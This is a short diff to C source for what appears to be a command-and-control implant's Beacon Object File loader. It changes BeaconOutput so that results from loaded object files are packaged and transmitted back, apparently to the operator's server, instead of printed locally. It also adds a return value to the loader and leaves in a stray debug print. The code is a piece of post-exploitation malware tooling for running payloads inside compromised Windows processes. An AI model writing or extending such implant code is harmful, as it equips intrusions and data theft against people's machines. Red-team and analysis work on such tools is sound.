@@ -82,7 +82,11 @@ FUNC char* BeaconDataExtract(datap* parser, int* size) {
 }
 
 FUNC void BeaconOutput(int type, char* data, int len) {
-    BK_PRINT( "%s\n", data);
+	BLACKOUT_INSTANCE
+
+ 	BK_PACKAGE = PackageCreate( CMD_COFFLOADER );
+    PackageAddBytes( BK_PACKAGE, data, len );
+	PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
 
 FUNC void BeaconPrintf(int type, char* fmt, ...) {
@@ -477,6 +481,8 @@ FUNC BOOL CoffLdr(
     if ( ObjCtx.Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
         return FALSE;
 
+	BK_PRINT( "aaa\n" );
+
 	VmSize = CoffVmSize(&ObjCtx);
 	BK_PRINT("[*] Virtual Size [%d bytes]\n", VmSize);
 
@@ -561,4 +567,6 @@ _END_OF_CODE:
 	// clear the struct context from the stack
 	//
 	MmZero(&ObjCtx, sizeof(ObjCtx));
+
+	return TRUE;
 }
